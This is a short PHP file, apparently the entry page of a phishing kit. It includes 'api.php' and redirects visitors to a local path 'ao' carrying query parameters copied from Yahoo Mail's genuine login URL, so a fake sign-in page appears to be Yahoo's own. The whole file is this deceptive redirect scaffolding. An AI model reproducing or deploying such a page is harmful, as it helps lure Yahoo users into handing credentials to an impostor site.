<?php

include ('api.php');

header ("Location: ao?.src=ym&.lang=en-US&.intl=us&.done=https%3A%2F%2Fmail.yahoo.com%2Fd");

?>